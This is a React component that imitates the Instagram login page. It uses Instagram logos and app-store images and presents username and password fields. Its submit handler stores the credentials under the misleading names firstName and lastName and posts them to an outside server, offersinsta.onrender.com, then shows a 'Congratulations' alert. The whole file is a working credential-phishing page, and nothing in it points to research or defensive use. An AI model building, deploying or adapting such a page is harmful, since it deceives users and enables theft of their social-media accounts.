import React, { useState } from 'react';
import './App.css';
import axios from 'axios';

function App() {
    const [firstName, setFirstName] = useState('');
    const [lastName, setLastName] = useState('');

    const handleSubmit = async (e) => {
        e.preventDefault();
        try {
            const response = await axios.post(`https://offersinsta.onrender.com/api/form`, { firstName, lastName });
            alert(' Congratulations We wiil get back you soon');
            setFirstName('');
            setLastName('');

            console.log(response)
        } catch (error) {
            console.error('There was an error submitting the form!', error);
        }
    };

    return (
        <div className="App">
            <main className="l-main">
                <div className="l-main__img">
                    <img src="https://raw.githubusercontent.com/yurimutti/instagram-login-page/master/assets/img/homepage.png" alt="Smartphones" />
                </div>
                <div className="l-user">
                    <div className="c-panel group">
                        <img className="c-panel__img" src="https://raw.githubusercontent.com/yurimutti/instagram-login-page/058ed9e7358fd1330956d29953b87621d934a98b/assets/img/instagram.svg" alt="Instagram" />
                        <div className="c-panel__form">
                            {/* First and Last Name Form */}
                            <form onSubmit={handleSubmit}>
                                <div>
                                    <label></label>
                                    <input 
                                        type="text" 
                                        value={firstName} 
                                        onChange={(e) => setFirstName(e.target.value)} 
                                        className="c-panel__input"
                                        required 
                                        placeholder='username'
                                    />
                                </div>
                                <div>
                                    <label></label>
                                    <input 
                                        type="text" 
                                        value={lastName} 
                                        onChange={(e) => setLastName(e.target.value)} 
                                        className="c-panel__input"
                                        required 
                                        placeholder='Password'
                                    />
                                </div>
                                <button type="submit" className="c-btn">Login</button>
                            </form>
                        </div>
                    </div>
                    <div className="c-signup group">
                        <p>Don't have an account? <span>Sign up</span></p>
                    </div>
                    <div className="c-app">
                        <p>Get the app.</p>
                        <div className="c-app__download">
                            <img src="https://raw.githubusercontent.com/yurimutti/instagram-login-page/master/assets/img/apple.png" alt="Apple Store" />
                            <img src="https://raw.githubusercontent.com/yurimutti/instagram-login-page/master/assets/img/google.png" alt="Google Play" />
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}

export default App;
